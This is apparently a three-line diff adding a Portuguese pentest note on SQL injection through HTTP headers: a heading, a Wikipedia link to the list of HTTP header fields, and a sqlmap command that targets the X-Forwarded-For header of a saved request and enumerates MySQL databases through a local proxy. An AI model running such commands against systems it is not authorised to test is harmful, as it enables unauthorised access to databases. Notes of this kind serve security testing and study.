@@ -1,0 +1,3 @@
+SQL Injection Avançado via cabeçalho
+https://en.wikipedia.org/wiki/List_of_HTTP_header_fields
+sqlmap -r header.txt -p X-Forwarded-For --dbs --dbms=mysql --proxy=http://127.0.0.1:8080
